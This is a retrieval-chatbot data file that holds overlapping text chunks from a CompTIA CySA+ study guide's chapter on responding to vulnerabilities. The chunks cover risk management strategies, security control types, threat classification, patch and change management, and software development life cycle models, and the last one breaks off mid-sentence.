rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and the intangible risks they face. Supply Chain Assessment When evaluating the risks to your organization, don’t forget about the risks that occur based on third-­party relationships. You rely on many different vendors to protect the confidentiality, integrity, and availability of your data. Performing vendor due diligence is a crucial security responsibility. 300 Chapter 8 ■ Responding to Vulnerabilities (continued) For example, how many cloud service providers handle your organization’s sensitive information? Those vendors become a crucial part of your supply chain from both operational and security perspectives. If they don’t have adequate security controls in place, your data is at risk. Similarly, the hardware that you use in your organization comes through a supply chain as well. How certain are you that it wasn’t tampered with on the way to your organization? Documents leaked by former NSA contractor Edward Snowden revealed that the U.S. government intercepted hardware shipments to foreign countries and implanted malicious code deep within their hardware. Performing hardware source authenticity assessments validates that the hardware you received was not tampered with after leaving the vendor. Managing Risk With a completed risk assessment in hand, organizations can then turn their attention to addressing those risks. Risk management is the process of systematically addressing the risks facing an organization. The risk assessment serves two important roles in the risk management process: ■■ ■■ The risk assessment provides guidance in prioritizing risks so that the risks with the highest probability and magnitude are addressed first. Quantitative risk assessments help determine whether the potential impact of a risk justifies the costs incurred by adopting a risk management approach. Risk managers should work their way through the risk assessment and identify an appropriate management strategy for each risk included in the assessment. They have four strategies to choose from: risk mitigation, risk avoidance, risk transference, and risk acceptance. In the next several sections, we discuss each of these strategies using two examples. First, we discuss the financial risk associated with the theft of a laptop from an employee. In this example, we are assuming that the laptop does not contain any unencrypted sensitive information. The risk that we are managing is the financial impact of losing the actual hardware. Second, we discuss the business risk associated with a distributed denial-­of-­service (DDoS) attack against an organization’s website. We use these two scenarios to help you understand the different options available when selecting a risk management strategy and the trade-­offs involved in that selection process. Risk Mitigation Risk mitigation is the process of applying security controls to reduce the probability and/or magnitude of a risk. Risk mitigation is the most common risk management strategy, and the Managing Risk 301 vast majority of the work of security professionals revolves around mitigating risks through the design, implementation, and management of security controls. Many of these controls involve engineering trade-­offs between functionality, performance, and security. We’ll discuss some examples of security controls later in this chapter. When you choose to mitigate a risk, you may apply
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a risk management strategy and the trade-­offs involved in that selection process. Risk Mitigation Risk mitigation is the process of applying security controls to reduce the probability and/or magnitude of a risk. Risk mitigation is the most common risk management strategy, and the Managing Risk 301 vast majority of the work of security professionals revolves around mitigating risks through the design, implementation, and management of security controls. Many of these controls involve engineering trade-­offs between functionality, performance, and security. We’ll discuss some examples of security controls later in this chapter. When you choose to mitigate a risk, you may apply one security control or a series of security controls. Each of those controls should reduce the probability that the risk will materialize, the magnitude of the risk should it materialize, or both the probability and magnitude. In our first scenario, we are concerned about the theft of laptops from our organization. If we want to mitigate that risk, we could choose from a variety of security controls. For example, purchasing cable locks for laptops might reduce the probability that a theft will occur. We could also choose to purchase a device registration service that provides tamperproof registration tags for devices, such as the STOP tags shown in Figure 8.3. These tags provide a prominent warning to potential thieves when attached to a device, as shown in Figure 8.3(a). This serves as a deterrent to theft, reducing the probability that the laptop will be stolen in the first place. If a thief does steal the device and removes the tag, it leaves the permanent residue, shown in Figure 8.3(b). Anyone finding the device is instructed to contact the registration vendor for instructions, reducing the potential impact of the theft if the device is returned. F I G U R E 8 . 3 (a) STOP tag attached to a device; (b) Residue remaining on device after attempted removal of a STOP tag (a) (b) Source: (a) and (b) Doug Belfiore In our second scenario, a DDoS attack against an organization’s website, we could choose among several mitigating controls. For example, we could simply purchase more bandwidth and server capacity, allowing us to absorb the bombardment of a DDoS attack, thus reducing the impact of an attack. We could also choose to purchase a third-­party DDoS 302 Chapter 8 ■ Responding to Vulnerabilities mitigation service that prevents the traffic from reaching our network in the first place, thus reducing the probability of an attack. Risk Avoidance Risk avoidance is a risk management strategy where we change our business practices to completely eliminate the potential that a risk will materialize. Risk avoidance may initially seem like a highly desirable approach. After all, who wouldn’t want to eliminate the risks facing their organization? There is, however, a major drawback. Risk avoidance strategies typically have a serious detrimental impact on the business. For example, consider the laptop theft risk discussed earlier in this chapter. We could adopt a risk avoidance strategy and completely eliminate the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	network in the first place, thus reducing the probability of an attack. Risk Avoidance Risk avoidance is a risk management strategy where we change our business practices to completely eliminate the potential that a risk will materialize. Risk avoidance may initially seem like a highly desirable approach. After all, who wouldn’t want to eliminate the risks facing their organization? There is, however, a major drawback. Risk avoidance strategies typically have a serious detrimental impact on the business. For example, consider the laptop theft risk discussed earlier in this chapter. We could adopt a risk avoidance strategy and completely eliminate the risk by not allowing employees to purchase or use laptops. This approach is unwieldy and would likely be met with strong opposition from employees and managers due to the negative impact on employee productivity. Similarly, we could avoid the risk of a DDoS attack against the organization’s website by simply shutting down the website. If there is no website to attack, there’s no risk that a DDoS attack can affect the site. But it’s highly improbable that business leaders will accept shutting down the website as a viable approach. In fact, you might consider being driven to shut down your website to avoid DDoS attacks as the ultimate denial-­of-­service attack! Risk Transference Risk transference shifts some of the impact of a risk from the organization experiencing the risk to another entity. The most common example of risk transference is purchasing an insurance policy that covers a risk. When purchasing insurance, the customer pays a premium to the insurance carrier. In exchange, the insurance carrier agrees to cover losses from risks specified in the policy. In the example of laptop theft, property insurance policies may cover the risk. If an employee’s laptop is stolen, the insurance policy would provide funds to cover either the value of the stolen device or the cost to replace the device, depending on the type of coverage. It’s unlikely that a property insurance policy would cover a DDoS attack. In fact, many general business policies exclude all cybersecurity risks. An organization seeking insurance coverage against this type of attack should purchase cybersecurity insurance, either as a separate policy or as a rider on an existing business insurance policy. This coverage would repay some or all of the cost of recovering operations and may also cover lost revenue during an attack. Risk Acceptance Risk acceptance is the final risk management strategy, and it boils down to deliberately choosing to take no other risk management strategy and to simply continue operations as normal in the face of the risk. A risk acceptance approach may be warranted if the cost of mitigating a risk is greater than the impact of the risk itself. Implementing Security Controls 303 Risk acceptance is a deliberate decision that comes as the result of a thoughtful analysis. It should not be undertaken as a default strategy. Simply stating that “we accept this risk” without analysis is not an example of an accepted risk; it
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	final risk management strategy, and it boils down to deliberately choosing to take no other risk management strategy and to simply continue operations as normal in the face of the risk. A risk acceptance approach may be warranted if the cost of mitigating a risk is greater than the impact of the risk itself. Implementing Security Controls 303 Risk acceptance is a deliberate decision that comes as the result of a thoughtful analysis. It should not be undertaken as a default strategy. Simply stating that “we accept this risk” without analysis is not an example of an accepted risk; it is an example of an unmanaged risk! . In our laptop theft example, we might decide that none of the other risk management strategies are appropriate. For example, we might feel that the use of cable locks is an unnecessary burden and that theft recovery tags are unlikely to work, leaving us without a viable risk mitigation strategy. Business leaders might require that employees have laptop devices, taking risk avoidance off the table. And the cost of a laptop insurance policy might be too high to justify. In that case, we might decide that we will simply accept the risk and cover the cost of stolen devices when thefts occur. That’s risk acceptance. In the case of the DDoS risk, we might go through a similar analysis and decide that risk mitigation and transference strategies are too costly. In the event we continue to operate the site, we might do so accepting the risk that a DDoS attack could take the site down. Exam Note Understand the four risk management strategies—­risk mitigation, risk avoidance, risk acceptance, and risk transference—­before you take the CySA+ exam. Be prepared to provide examples of these strategies and to identify which strategy is being used in a given scenario. Implementing Security Controls As an organization analyzes its risk environment, technical and business leaders determine the level of protection required to preserve the confidentiality, integrity, and availability of their information and systems. They express these requirements by writing the control objectives that the organization wishes to achieve. These control objectives are statements of a desired security state, but they do not, by themselves, actually carry out security activities. Security controls are specific measures that fulfill the security objectives of an organization. Security Control Categories Security controls are categorized based on their mechanism of action: the way that they achieve their objectives. There are three different categories of security control: ■■ Technical controls enforce confidentiality, integrity, and availability in the digital space. Examples of technical security controls include firewall rules, access control lists, intrusion prevention systems, and encryption. 304 ■■ ■■ Chapter 8 ■ Responding to Vulnerabilities Operational controls include the processes that we put in place to manage technology in a secure manner. These include user access reviews, log monitoring, and vulnerability management. Managerial controls are procedural mechanisms that focus on the mechanics of the risk management process. Examples of administrative controls include periodic risk assessments,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	that they achieve their objectives. There are three different categories of security control: ■■ Technical controls enforce confidentiality, integrity, and availability in the digital space. Examples of technical security controls include firewall rules, access control lists, intrusion prevention systems, and encryption. 304 ■■ ■■ Chapter 8 ■ Responding to Vulnerabilities Operational controls include the processes that we put in place to manage technology in a secure manner. These include user access reviews, log monitoring, and vulnerability management. Managerial controls are procedural mechanisms that focus on the mechanics of the risk management process. Examples of administrative controls include periodic risk assessments, security planning exercises, and the incorporation of security into the organization’s change management, service acquisition, and project management practices. Organizations should select a set of security controls that meets their control objectives based on the criteria and parameters that they either select for their environment or have imposed on them by outside regulators. For example, an organization that handles sensitive information might decide that confidentiality concerns surrounding that information require the highest level of control. At the same time, they might conclude that the availability of their website is not of critical importance. Given these considerations, they would dedicate significant resources to the confidentiality of sensitive information while perhaps investing little, if any, time and money protecting their website against a denial-­of-­service attack. Many control objectives require a combination of technical, operational, and management controls. For example, an organization might have the control objective of preventing unauthorized access to a datacenter. They might achieve this goal by implementing biometric access control (technical control), performing regular reviews of authorized access (operational control), and conducting routine risk assessments (managerial control). Security Control Types We can also divide security controls into types, based on their desired effect. The types of security control include the following: ■■ ■■ ■■ ■■ ■■ Preventive controls intend to stop a security issue before it occurs. Firewalls and encryption are examples of preventive controls. Detective controls identify security events that have already occurred. Intrusion detection systems are detective controls. Responsive controls help an organization respond to an active security incident. The use of a 24×7 security operations center that can triage and direct first responders is an example of a responsive control. Corrective controls remediate security issues that have already occurred. Restoring backups after a ransomware attack is an example of a corrective control. Compensating controls are controls designed to mitigate the risk associated with exceptions made to a security policy. Threat Classification 305 Threat Classification Although there are many ways to classify threats, common classifications include differentiating between known threats, which you are aware of and are likely to have useful information about, and unknown threats, which you can prepare for only through use of general controls and processes. Zero-­day threats, or threats that exploit an unknown security vulnerability, are one of the most common types of unknown threats. Advanced persistent threat actors, particularly those with nation-­state resources, commonly acquire zero-­day exploit information and leverage it to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	designed to mitigate the risk associated with exceptions made to a security policy. Threat Classification 305 Threat Classification Although there are many ways to classify threats, common classifications include differentiating between known threats, which you are aware of and are likely to have useful information about, and unknown threats, which you can prepare for only through use of general controls and processes. Zero-­day threats, or threats that exploit an unknown security vulnerability, are one of the most common types of unknown threats. Advanced persistent threat actors, particularly those with nation-­state resources, commonly acquire zero-­day exploit information and leverage it to their advantage. Classifying Threats with STRIDE Microsoft’s STRIDE classification model is one method you can use to classify threats based on what they leverage. STRIDE stands for: Spoofing of user identity Tampering Repudiation Information disclosure Denial of service Elevation of privilege Other models include PASTA (Process for Attack Simulation and Threat Analysis), LINDDUN, CVSS (which we discussed in Chapter 7, “Analyzing Vulnerability Scans”), and techniques like using attack trees, security cards, and others. A classification tool provides two major benefits. First, it allows you to use a common framework to describe threats, allowing others to contribute and manage threat information. Second, models serve as a reminder of the types of threats that exist and can help analysts and security practitioners perform better threat analysis by giving them a list of potential threat options. Threat Research and Modeling Organizations actively seek to understand the threats that they are likely to face by conducting threat modeling activities. Threat modeling takes many factors into account, but common elements include the following: ■■ Assessing adversary capability, or the resources, intent, and ability of the likely threat actor or organization. 306 ■■ ■■ Chapter 8 ■ Responding to Vulnerabilities The total attack surface of the organization you are assessing. This means any system, device, network, application, staff member, or other target that a threat may target. Listing possible attack vectors, the means by which attackers can gain access to their targets. ■■ The impact if the attack was successful. ■■ The likelihood of the attack or threat succeeding. All of these items can be scored to help assess organizational risk, as well as to help the organization understand the threats it faces. Once an organization has established a threat model, or has made it part of their threat modeling activities, they will conduct threat research. There are a number of types of threat research that you or your organization may choose to conduct. You may look at the reputation of a site, netblock, or actor to determine whether they have a history or habit of malicious behavior. This is called threat reputation, and it is most often paired with IP addresses or domains, but file reputation services and data feeds also exist, as well as other reputation-­based tools. You can see an example of this done via Cisco’s Talos Intelligence reputation lookup tools found at https://talosintelligence.com/reputation_center and shown in Figure 8.4. Note that you can
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	There are a number of types of threat research that you or your organization may choose to conduct. You may look at the reputation of a site, netblock, or actor to determine whether they have a history or habit of malicious behavior. This is called threat reputation, and it is most often paired with IP addresses or domains, but file reputation services and data feeds also exist, as well as other reputation-­based tools. You can see an example of this done via Cisco’s Talos Intelligence reputation lookup tools found at https://talosintelligence.com/reputation_center and shown in Figure 8.4. Note that you can see the host’s owner and DNS information, as well as email reputation, web reputation, how much spam email it is sending, and if it is on lists of known bad actors. In some cases, you may also get information about the content. Behavioral assessments are particularly useful for insider threats because insider threat behavior is often difficult to distinguish from job-­or role-­related work. Detecting internal threat behaviors relies heavily on the context of the actions that were performed; a broad view of the insider’s actions across all the systems, applications, and networks they interact with; and the availability to provide insight over time. Many insider attacks rely on privileged account abuse, leveraging access to sensitive information, and use of shared passwords. They also often occur outside of normal hours or may require more time, making it possible to identify them through these differences in behavior. Another measure used to assess threats are indicators of compromise (IOCs). Indicators of compromise are forensic evidence or data that can help to identify an attack. Unlike the other assessment methods, indicators of compromise are used exclusively after an attack has started—­but it may still be ongoing! That doesn’t mean that they’re useless for threat assessment, though. Knowing which IOCs are associated with a given threat actor, or common exploit path, can help defenders take appropriate steps to prevent further compromise and possibly to identify the threat actor. It can also help defenders limit the damage or stop the attack from progressing. Managing the Computing Environment FIGURE 8.4 307 A Talos reputation report for a single host Managing the Computing Environment Computing environments are complex ecosystems of applications, operating systems, servers, endpoints, network devices and other components that interact with each other to meet business requirements. That complexity also creates the opportunity for vulnerabilities to arise that might threaten the security of that environment. Organizations can take important actions to manage their computing activities in a manner that reduces risk. These activities include attack surface management, change and configuration management, and patch management. 308 Chapter 8 ■ Responding to Vulnerabilities Attack Surface Management An organization’s attack surface is the combination of all systems and services that have some exposure to attackers and might allow those attackers to gain access to the organization’s environment. The attack surface includes everything from border firewalls to public web servers and from traveling laptops to mobile devices. Cybersecurity analysts seeking
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	arise that might threaten the security of that environment. Organizations can take important actions to manage their computing activities in a manner that reduces risk. These activities include attack surface management, change and configuration management, and patch management. 308 Chapter 8 ■ Responding to Vulnerabilities Attack Surface Management An organization’s attack surface is the combination of all systems and services that have some exposure to attackers and might allow those attackers to gain access to the organization’s environment. The attack surface includes everything from border firewalls to public web servers and from traveling laptops to mobile devices. Cybersecurity analysts seeking to manage their organization’s attack surface may engage in a variety of activities. These include the following: ■■ ■■ ■■ ■■ Edge discovery scanning that identifies any systems or devices with public exposure by scanning IP addresses belonging to the organization Passive discovery techniques that monitor inbound and outbound traffic to detect devices that did not appear during other discovery scans Security controls testing that verifies that the organization’s array of security controls are functioning properly Penetration testing and adversary emulation that seeks to emulate the actions of an adversary to discover flaws in the organization’s security controls Cybersecurity analysts may then use the results of these discovery and testing techniques to make changes to their environment that improve security. Making these changes is called attack surface reduction because it reduces the number of ways that a potential adversary might attack the organization. Bug Bounty Programs Bug bounty programs provide a formal process that allows organizations to open their systems to inspection by security researchers in a controlled environment that encourages attackers to report vulnerabilities in a responsible fashion. Organizations deploying a bug bounty program typically do so with the assistance of a vendor who specializes in the design, implementation, and operation of these programs. Security testers will probe your systems for vulnerabilities regardless of whether you sanction this activity. A tester who discovers a vulnerability has several options available for handling that information: ■■ Public disclosure ■■ Exploitation ■■ Responsible disclosure ■■ No action When an organization has a bug bounty program, they do not change the core options available to the discoverer of a vulnerability, but they incentivize the tester to follow the path most desirable to the organization: responsible disclosure. This incentivization Managing the Computing Environment 309 normally comes in the form of a direct financial payment to the attacker, with bounties ranging from several hundred dollars for a low-­impact vulnerability to significant payments in the tens of thousands of dollars for serious vulnerabilities with broad impact. In January 2018, Google paid a $112,500 bounty to a Chinese security researcher who discovered a serious vulnerability in the company’s Pixel phones. Change and Configuration Management Configuration management tracks the way that specific endpoint devices are set up. Configuration management tracks both operating systems settings and the inventory of software installed on a device. Change management programs provide organizations with a formal process for identifying, requesting, approving, and implementing
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to the attacker, with bounties ranging from several hundred dollars for a low-­impact vulnerability to significant payments in the tens of thousands of dollars for serious vulnerabilities with broad impact. In January 2018, Google paid a $112,500 bounty to a Chinese security researcher who discovered a serious vulnerability in the company’s Pixel phones. Change and Configuration Management Configuration management tracks the way that specific endpoint devices are set up. Configuration management tracks both operating systems settings and the inventory of software installed on a device. Change management programs provide organizations with a formal process for identifying, requesting, approving, and implementing changes to configurations. Baselining is an important component of configuration management. A baseline is a snapshot of a system or application at a given point in time. It may be used to assess whether a system has changed outside of an approved change management process. System administrators may compare a running system to a baseline to identify all changes to the system and then compare those changes to a list of approved change requests. Version control is also a critical component of change management programs, particularly in the areas of software and script development. Versioning assigns each release of a piece of software an incrementing version number that may be used to identify any given copy. Configuration management should also create artifacts that may be used to help understand system configuration. For example, diagrams often play an important role in helping security professionals understand how a system was designed and configured. These can be crucial when performing time-­sensitive troubleshooting or incident investigations. Together, change and configuration management allow technology professionals to track the status of hardware, software, and firmware, ensuring that change occurs when desired but in a controlled fashion that minimizes risk to the organization. Maintenance Windows Changes have the potential to be disruptive to an organization and, for this reason, the timing of changes should be carefully coordinated. Many organizations choose to consolidate many changes in a single period of time known as a maintenance window. Maintenance windows typically occur on evenings and weekends or during other periods of time where business activity is low. These maintenance windows are scheduled far in advance and coordinated by a change manager who publishes a list of planned changes and monitors the process of implementing, validating, and testing changes. 310 Chapter 8 ■ Responding to Vulnerabilities Patch Management Applying patches to operating systems is critical because it ensures that systems are not vulnerable to security exploits discovered by attackers. Each time an operating system vendor discovers a new vulnerability, they create a patch that corrects the issue. Promptly applying patches ensures a clean and tidy operating system. In Windows, the Windows Update mechanism is the simplest way to apply security patches to systems as soon as they are released. On Linux systems, administrators may take advantage of a variety of update mechanisms depending on their specific Linux distributions and organizational practices. As a security administrator, you should not only ensure that
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	operating systems is critical because it ensures that systems are not vulnerable to security exploits discovered by attackers. Each time an operating system vendor discovers a new vulnerability, they create a patch that corrects the issue. Promptly applying patches ensures a clean and tidy operating system. In Windows, the Windows Update mechanism is the simplest way to apply security patches to systems as soon as they are released. On Linux systems, administrators may take advantage of a variety of update mechanisms depending on their specific Linux distributions and organizational practices. As a security administrator, you should not only ensure that your systems are configured to receive updates, you should also analyze the output of patch management processes to ensure that those patches are applied. Configuration management tools can assist you with automating this work. They also help you keep track of patches to the applications that you run in your organization. Software Assurance Best Practices Building, deploying, and maintaining software requires security involvement throughout the software’s life cycle. The CySA+ exam objectives focus on the software development life cycle, software assessment methods and tools, coding practices, platforms, and architectures. The Software Development Life Cycle The software development life cycle (SDLC) describes the steps in a model for software development throughout its life. As shown in Figure 8.5, it maps software creation from an idea to requirements gathering and analysis to design, coding, testing, and rollout. Once software is in production, it also includes user training, maintenance, and decommissioning at the end of the software package’s useful life. Software development does not always follow a formal model, but most enterprise development for major applications does follow most, if not all, of these phases. In some cases, developers may even use elements of an SDLC model without realizing it! The SDLC is useful for organizations and for developers because it provides a consistent framework to structure workflow and to provide planning for the development process. Despite these advantages, simply picking an SDLC model to implement may not always be the best choice. Each SDLC model has certain types of work and projects that it fits better than others, making choosing an SDLC model that fits the work an important part of the process. In this chapter, we refer to the output of the SDLC as “software” or as an “application,” but the SDLC may be run for a service, a system, or other output. Feel free to substitute the right phrasing that is appropriate for you. Software Assurance Best Practices FIGURE 8.5 Planning 311 High-­level SDLC view Requirements Design Coding Testing Training and Transition Ongoing Operations and Maintenance End of Life Decommissioning Software Development Phases Regardless of which SDLC or process is chosen by your organization, a few phases appear in most SDLC models: 1. The feasibility phase is where initial investigations into whether the effort should occur are conducted. Feasibility also looks at alternative solutions and high-­level costs for each solution proposed. It results in a recommendation with a plan to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	other output. Feel free to substitute the right phrasing that is appropriate for you. Software Assurance Best Practices FIGURE 8.5 Planning 311 High-­level SDLC view Requirements Design Coding Testing Training and Transition Ongoing Operations and Maintenance End of Life Decommissioning Software Development Phases Regardless of which SDLC or process is chosen by your organization, a few phases appear in most SDLC models: 1. The feasibility phase is where initial investigations into whether the effort should occur are conducted. Feasibility also looks at alternative solutions and high-­level costs for each solution proposed. It results in a recommendation with a plan to move forward. 2. Once an effort has been deemed feasible, it will typically go through an analysis and requirements definition phase. In this phase customer input is sought to determine what the desired functionality is, what the current system or application currently does and doesn’t do, and what improvements are desired. Requirements may be ranked to determine which are most critical to the success of the project. Security requirements definition is an important part of the analysis and requirements definition phase. It ensures that the application is designed to be secure and that secure coding practices are used. 3. The design phase includes design for functionality, architecture, integration points and techniques, dataflows, business processes, and any other elements that require design consideration. 4. The actual coding of the application occurs during the development phase. This phase may involve testing of parts of the software, including unit testing (testing of small components individually to ensure they function properly) and code analysis. 312 Chapter 8 ■ Responding to Vulnerabilities 5. Although some testing is likely to occur in the development phase, formal testing with customers or others outside of the development team occurs in the testing and integration phase. Individual units or software components are integrated and then tested to ensure proper functionality. In addition, connections to outside services, data sources, and other integration may occur during this phase. During this phase user acceptance testing (UAT) occurs to ensure that the users of the software are satisfied with its functionality. 6. The important task of ensuring that the end users are trained on the software and that the software has entered general use occurs in the training and transition phase. This phase is sometimes called the acceptance, installation, and deployment phase. 7. Once a project reaches completion, the application or service will enter what is usually the longest phase: ongoing operations and maintenance. This phase includes patching, updating, minor modifications, and other work that goes into daily support. 8. The disposition phase occurs when a product or system reaches the end of its life. Although disposition is often ignored in the excitement of developing new products, it is an important phase for a number of reasons: shutting down old products can produce cost savings, replacing existing tools may require specific knowledge or additional effort, and data and systems may need to be preserved or properly disposed of. The order of the phases
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	enter what is usually the longest phase: ongoing operations and maintenance. This phase includes patching, updating, minor modifications, and other work that goes into daily support. 8. The disposition phase occurs when a product or system reaches the end of its life. Although disposition is often ignored in the excitement of developing new products, it is an important phase for a number of reasons: shutting down old products can produce cost savings, replacing existing tools may require specific knowledge or additional effort, and data and systems may need to be preserved or properly disposed of. The order of the phases may vary, with some progressing in a simple linear fashion and others taking an iterative or parallel approach. You will still see some form of each of these phases in successful software life cycles. Development, Test, and Production—­Oh, My! Many organizations use multiple environments for their software and systems development and testing. The names and specific purposes for these systems vary depending on organizational needs, but the most common environments are as follows: ■■ ■■ ■■ Development, typically used for developers or other “builders” to do their work. Some workflows provide each developer with their own development environment; others use a shared development environment. Test, an environment where the software or systems can be tested and validated without impacting the production environment. In some schemes, this is preproduction, whereas in others a separate preproduction staging environment is used. Production, the live system. Software, patches, and other changes that have been tested and approved move to production. Change management processes are typically followed to move through these environments. They also provide the ability to perform rollback, undoing changes that had unintended consequences and restoring the system to a prior state. This provides accountability and oversight and may be required for audit or compliance purposes as well. Software Assurance Best Practices 313 Software Development Models The SDLC can be approached in many ways, and over time a number of formal models have been created to help provide a common framework for development. While formal SDLC models can be very detailed, with specific practices, procedures, and documentation, many organizations choose the elements of one or more models that best fit their organizational style, workflow, and requirements. Waterfall The Waterfall methodology is a sequential model in which each phase is followed by the next phase. Phases do not overlap, and each logically leads to the next. A typical six-­phase Waterfall process is shown in Figure 8.6. In Phase 1, requirements are gathered and documented. Phase 2 involves analysis intended to build business rules and models. In Phase 3, a software architecture is designed, and coding and integration of the software occurs in Phase 4. Once the software is complete, Phase 5 Occurs, with testing and debugging being completed in this phase. Finally the software enters an operational phase, with support, maintenance, and other operational activities happening on an ongoing basis. FIGURE 8.6 The Waterfall SDLC model 1. Gather Requirements 2. Analysis 3. Design 4.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the next. A typical six-­phase Waterfall process is shown in Figure 8.6. In Phase 1, requirements are gathered and documented. Phase 2 involves analysis intended to build business rules and models. In Phase 3, a software architecture is designed, and coding and integration of the software occurs in Phase 4. Once the software is complete, Phase 5 Occurs, with testing and debugging being completed in this phase. Finally the software enters an operational phase, with support, maintenance, and other operational activities happening on an ongoing basis. FIGURE 8.6 The Waterfall SDLC model 1. Gather Requirements 2. Analysis 3. Design 4. Implement 5. Testing 6. Deployment Waterfall has been replaced in many organizations because it is seen as relatively inflexible, but it remains in use for complex systems. Since Waterfall is not highly responsive to changes and does not account for internal iterative work, it is typically recommended for development efforts that involve a fixed scope and a known timeframe for delivery and that are using a stable, well-­understood technology platform. Chapter 8 314 ■ Responding to Vulnerabilities Spiral The Spiral model uses the linear development concepts from the Waterfall model and adds an iterative process that revisits four phases multiple times during the development life cycle to gather more detailed requirements, design functionality guided by the requirements, and build based on the design. In addition, the Spiral model puts significant emphasis on risk assessment as part of the SDLC, reviewing risks multiple times during the development process. The Spiral model shown in Figure 8.7 uses four phases, which it repeatedly visits throughout the development life cycle: 1. Identification, or requirements gathering, which initially gathers business requirements, system requirements, and more detailed requirements for subsystems or modules as the process continues. 2. Design, conceptual, architectural, logical, and sometimes physical or final design. 3. Build, which produces an initial proof of concept and then further development releases until the final production build is produced. 4. Evaluation, which involves risk analysis for the development project intended to monitor the feasibility of delivering the software from a technical and managerial viewpoint. As the development cycle continues, this phase also involves customer testing and feedback to ensure customer acceptance. FIGURE 8.7 The Spiral SDLC model Design Requirements Gathering / Identification 5. Round 2 Requirements 6. Updated Design 1. Initial Requirements 2. First Design Start 3. Proof of Concept Build 8. Test Second Build and Re-Assess Risks Evaluation / Risk Analysis 4. Test POC and Assess Risks 7. Second Build Build Software Assurance Best Practices 315 The Spiral model provides greater flexibility to handle changes in requirements as well as external influences such as availability of customer feedback and development staff. It also allows the software development life cycle to start earlier in the process than Waterfall does. Because Spiral revisits its process, it is possible for this model to result in rework or to identify design requirements later in the process that require a significant design change due to more detailed requirements coming to light.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Risks Evaluation / Risk Analysis 4. Test POC and Assess Risks 7. Second Build Build Software Assurance Best Practices 315 The Spiral model provides greater flexibility to handle changes in requirements as well as external influences such as availability of customer feedback and development staff. It also allows the software development life cycle to start earlier in the process than Waterfall does. Because Spiral revisits its process, it is possible for this model to result in rework or to identify design requirements later in the process that require a significant design change due to more detailed requirements coming to light. Agile Agile software development is an iterative and incremental process, rather than the linear processes that Waterfall and Spiral use. Agile is rooted in the Manifesto for Agile Software Development, a document that has four basic premises: ■■ Individuals and interactions are more important than processes and tools. ■■ Working software is preferable to comprehensive documentation. ■■ Customer collaboration replaces contract negotiation. ■■ Responding to change is key, rather than following a plan. If you are used to a Waterfall or Spiral development process, Agile is a significant departure from the planning, design, and documentation-­centric approaches that Agile’s predecessors use. Agile methods tend to break work up into smaller units, allowing work to be done more quickly and with less up-­front planning. It focuses on adapting to needs, rather than predicting them, with major milestones identified early in the process but subject to change as the project continues to develop. Work is typically broken up into short working sessions, called sprints, that can last days to a few weeks. Figure 8.8 shows a simplified view of an Agile project methodology with multiple sprints conducted. When the developers and customer agree that the task is done or when the time allocated for the sprints is complete, the development effort is completed. FIGURE 8.8 Agile sprints Sprint Planning Demonstration Sprint Planning Development Demonstration Sprint Planning Development Demonstration Development Testing Testing Testing Sprint 1 Sprint 2 Sprint X The Agile methodology is based on 12 principles: ■■ Ensure customer satisfaction via early and continuous delivery of the software. ■■ Welcome changing requirements, even late in the development process. 316 Chapter 8 ■ Responding to Vulnerabilities ■■ Deliver working software frequently (in weeks rather than months). ■■ Ensure daily cooperation between developers and businesspeople. ■■ ■■ ■■ ■■ Projects should be built around motivated individuals who get the support, trust, and environment they need to succeed. Face-­to-­face conversations are the most efficient way to convey information inside the development team. Progress is measured by having working software. Development should be done at a sustainable pace that can be maintained on an ongoing basis. ■■ Pay continuous attention to technical excellence and good design. ■■ Simplicity—­the art of maximizing the amount of work not done—­is essential. ■■ The best architectures, requirements, and designs emerge from self-­organizing teams. ■■ Teams should reflect on how to become more effective and then implement that behavior at regular intervals.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	individuals who get the support, trust, and environment they need to succeed. Face-­to-­face conversations are the most efficient way to convey information inside the development team. Progress is measured by having working software. Development should be done at a sustainable pace that can be maintained on an ongoing basis. ■■ Pay continuous attention to technical excellence and good design. ■■ Simplicity—­the art of maximizing the amount of work not done—­is essential. ■■ The best architectures, requirements, and designs emerge from self-­organizing teams. ■■ Teams should reflect on how to become more effective and then implement that behavior at regular intervals. These principles drive an SDLC process that is less formally structured than Spiral or Waterfall but that has many opportunities for customer feedback and revision. It can react more nimbly to problems and will typically allow faster customer feedback—­an advantage when security issues are discovered. Agile development uses a number of specialized terms: ■■ ■■ ■■ ■■ ■■ Backlogs are lists of features or tasks that are required to complete a project. Planning poker is a tool for estimation and planning used in Agile development processes. Estimators are given cards with values for the amount of work required for a task. Estimators are asked to estimate, and each reveals their “bid” on the task. This is done until agreement is reached, with the goal to have estimators reach the same estimate through discussion. Timeboxing, a term that describes the use of timeboxes. Timeboxes are a previously agreed-­on time that a person or team uses to work on a specific goal. This limits the time to work on a goal to the timeboxed time, rather than allowing work until completion. Once a timebox is over, the completed work is assessed to determine what needs to occur next. User stories are collected to describe high-­level user requirements. A user story might be “Users can change their password via the mobile app,” which would provide direction for estimation and planning for an Agile work session. Velocity tracking is conducted by adding up the estimates for the current sprint’s effort and then comparing that to what was completed. This tells the team whether they are on track, faster, or slower than expected. Software Assurance Best Practices 317 Rapid Application Development The RAD (Rapid Application Development) model is an iterative process that relies on building prototypes. Unlike many other methods, there is no planning phase; instead, planning is done as the software is written. RAD relies on functional components of the code being developed in parallel and then integrated to produce the finished product. Much like Agile, RAD can provide a highly responsive development environment. RAD involves five phases, as shown in Figure 8.9. 1. Business modeling, which 